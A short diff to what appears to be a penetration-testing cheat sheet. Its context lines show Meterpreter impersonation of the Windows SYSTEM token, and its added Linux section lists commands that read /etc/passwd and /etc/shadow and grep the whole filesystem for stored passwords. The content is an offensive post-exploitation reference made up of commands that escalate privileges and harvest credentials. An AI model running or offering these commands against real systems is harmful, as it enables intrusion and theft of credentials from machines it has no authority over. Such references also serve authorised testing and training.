@@ -95,6 +95,14 @@ meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
 meterpreter > getuid                  #(NT Authority\system)
 
 
+🟦 Linux
+
+
+$ cat /etc/shells
+$ cat /etc/passwd
+$ cat /etc/shadow
+$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null       #(see if passw is around)
+$ grep --color=auto -rnw '/etc or /var' -ie "PASSWORD" --color=always 2> /dev/null
 
 
 
